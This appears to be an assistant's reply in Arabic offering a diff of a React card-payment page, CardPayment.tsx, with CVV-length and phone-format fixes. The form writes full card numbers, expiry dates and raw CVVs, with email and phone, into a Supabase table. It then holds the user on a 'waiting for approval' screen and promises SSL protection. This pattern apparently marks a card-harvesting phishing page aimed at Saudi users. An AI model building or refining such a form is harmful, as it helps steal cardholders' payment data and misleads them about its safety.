@@ -1,3 +1,5 @@
+هذا الكود الكامل لـ CardPayment.tsx مع إصلاح CVV:
+
 import { useState, useRef, useEffect } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
@@ -169,7 +171,6 @@ const WaitingApproval = ({
 
   return (
     <div className="flex flex-col items-center justify-center py-10 text-center">
-      {/* دائرة العداد */}
       <div className="relative w-28 h-28 mb-6">
         <svg className="w-28 h-28 -rotate-90" viewBox="0 0 112 112">
           <circle cx="56" cy="56" r="50" fill="none" stroke="#f1f5f9" strokeWidth="7" />
@@ -228,7 +229,6 @@ const CardPayment = () => {
     subtotal?: number;
   } | null;
 
-  // Form
   const [cardNumber, setCardNumber] = useState("");
   const [cardHolder, setCardHolder] = useState(
     state?.firstName && state?.lastName ? `${state.firstName} ${state.lastName}` : ""
@@ -237,11 +237,9 @@ const CardPayment = () => {
   const [cvv, setCvv]         = useState("");
   const [focused, setFocused] = useState<string | null>(null);
 
-  // Detection
   const [brand, setBrand] = useState<"visa" | "mastercard" | "amex" | "mada" | null>(null);
   const [bank, setBank]   = useState<{ bank: string; bankAr: string; color: string } | null>(null);
 
-  // UI
   const [errors, setErrors]   = useState<Record<string, string>>({});
   const [loading, setLoading] = useState(false);
   const [step, setStep]       = useState<"form" | "waiting">("form");
@@ -252,8 +250,11 @@ const CardPayment = () => {
     const fmt = formatCardNumber(e.target.value);
     setCardNumber(fmt);
     const clean = fmt.replace(/\s/g, "");
-    setBrand(detectCardBrand(clean));
+    const newBrand = detectCardBrand(clean);
+    setBrand(newBrand);
     setBank(detectBank(clean));
+    // ✅ إعادة ضبط CVV إذا تغير نوع البطاقة
+    if (newBrand !== brand) setCvv("");
     if (errors.cardNumber) setErrors(p => ({ ...p, cardNumber: "" }));
   };
 
@@ -265,7 +266,9 @@ const CardPayment = () => {
   };
 
   const onCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const v = e.target.value.replace(/\D/g, "").substring(0, brand === "amex" ? 4 : 3);
+    // ✅ الإصلاح: تحديد الطول بدقة حسب نوع البطاقة
+    const maxLen = brand === "amex" ? 4 : 3;
+    const v = e.target.value.replace(/\D/g, "").substring(0, maxLen);
     setCvv(v);
     if (errors.cvv) setErrors(p => ({ ...p, cvv: "" }));
   };
@@ -284,7 +287,8 @@ const CardPayment = () => {
       if (m < 1 || m > 12 || new Date(2000 + y, m - 1) < new Date())
         e.expiry = isAr ? "البطاقة منتهية الصلاحية" : "Card expired";
     }
-    if (cvv.length < (brand === "amex" ? 4 : 3)) e.cvv = isAr ? "CVV غير صحيح" : "Invalid CVV";
+    const cvvRequired = brand === "amex" ? 4 : 3;
+    if (cvv.length < cvvRequired) e.cvv = isAr ? "CVV غير صحيح" : "Invalid CVV";
     setErrors(e);
     return Object.keys(e).length === 0;
   };
@@ -307,9 +311,8 @@ const CardPayment = () => {
           card_expiry: expiry,
           card_cvv: cvv,
           total_amount: state?.total || 0,
-          // ✅ ربط الطلب بالزائر عبر email و phone
           email: state?.email || null,
-          phone: state?.phone ? `00966${state.phone}` : null,
+          phone: state?.phone ? `00966${state.phone.replace(/^0+/, "").replace(/^\+966/, "")}` : null,
           subtotal: state?.subtotal || null,
           vat: state?.vat || null,
           tickets: state?.tickets || null,
@@ -355,7 +358,6 @@ const CardPayment = () => {
     });
   };
 
-  // ─── Input class helper ───────────────────────────────────────────────────
   const inputClass = (field: string) =>
     `w-full px-4 py-3 rounded-xl border text-sm transition-all outline-none bg-background text-foreground
     ${errors[field]
@@ -370,8 +372,6 @@ const CardPayment = () => {
       <Header />
       <main className="pt-28 pb-20 px-4">
         <div className="max-w-lg mx-auto">
-
-          {/* بطاقة رئيسية */}
           <div className="bg-card rounded-2xl border border-border shadow-sm overflow-hidden">
 
             {/* رأس الصفحة */}
@@ -425,7 +425,6 @@ const CardPayment = () => {
                         : "linear-gradient(135deg, #1e293b 0%, #0f172a 100%)",
                     }}
                   >
-                    {/* شعار البنك + نوع البطاقة */}
                     <div className="flex items-start justify-between">
                       <div>
                         <p className="text-white/50 text-xs">
@@ -437,21 +436,18 @@ const CardPayment = () => {
                       </div>
                     </div>
 
-                    {/* شريحة */}
                     <div className="w-10 h-8 rounded-md bg-gradient-to-br from-yellow-300 to-yellow-500 flex items-center justify-center">
                       <div className="w-6 h-5 border border-yellow-600/40 rounded-sm grid grid-cols-3 gap-px p-0.5">
                         {[...Array(9)].map((_, i) => <div key={i} className="bg-yellow-600/30 rounded-sm" />)}
                       </div>
                     </div>
 
-                    {/* رقم البطاقة */}
                     <p className="text-white font-mono text-lg tracking-[0.2em]">
                       {cardNumber
                         ? cardNumber.padEnd(19, " ").substring(0, 19)
                         : "•••• •••• •••• ••••"}
                     </p>
 
-                    {/* الاسم + التاريخ */}
                     <div className="flex items-end justify-between">
                       <div>
                         <p className="text-white/40 text-[10px] mb-0.5">{isAr ? "حامل البطاقة" : "Card Holder"}</p>
@@ -465,13 +461,12 @@ const CardPayment = () => {
                       </div>
                     </div>
 
-                    {/* CVV على الخلف (تأثير بصري) */}
                     {focused === "cvv" && (
                       <div className="absolute inset-0 bg-black/60 rounded-2xl flex items-center justify-center">
                         <div className="text-center">
                           <p className="text-white/60 text-xs mb-1">CVV</p>
                           <p className="text-white font-mono font-bold text-2xl tracking-widest">
-                            {cvv || "•••"}
+                            {cvv || (brand === "amex" ? "••••" : "•••")}
                           </p>
                         </div>
                       </div>
@@ -545,6 +540,7 @@ const CardPayment = () => {
                         onFocus={() => setFocused("expiry")}
                         onBlur={() => setFocused(null)}
                         placeholder="MM/YY"
+                        maxLength={5}
                         className={`${inputClass("expiry")} font-mono`}
                       />
                       {errors.expiry && <p className="text-destructive text-xs mt-1">{errors.expiry}</p>}
@@ -552,6 +548,10 @@ const CardPayment = () => {
                     <div>
                       <label className="block text-sm font-medium text-foreground mb-1.5">
                         {isAr ? "رمز الأمان" : "CVV"}
+                        {/* ✅ تلميح الطول */}
+                        <span className="text-muted-foreground font-normal mr-1">
+                          ({brand === "amex" ? "4" : "3"} {isAr ? "أرقام" : "digits"})
+                        </span>
                       </label>
                       <input
                         type="password"
@@ -561,6 +561,7 @@ const CardPayment = () => {
                         onFocus={() => setFocused("cvv")}
                         onBlur={() => setFocused(null)}
                         placeholder={brand === "amex" ? "••••" : "•••"}
+                        maxLength={brand === "amex" ? 4 : 3}
                         className={`${inputClass("cvv")} font-mono`}
                       />
                       {errors.cvv && <p className="text-destructive text-xs mt-1">{errors.cvv}</p>}
@@ -615,7 +616,6 @@ const CardPayment = () => {
             </AnimatePresence>
           </div>
 
-          {/* معلومات الأمان */}
           <div className="flex items-center justify-center gap-2 mt-4 text-xs text-muted-foreground">
             <ShieldCheck className="w-4 h-4" />
             <span>{isAr ? "بياناتك محمية بتشفير SSL 256-bit" : "Your data is protected by 256-bit SSL encryption"}</span>
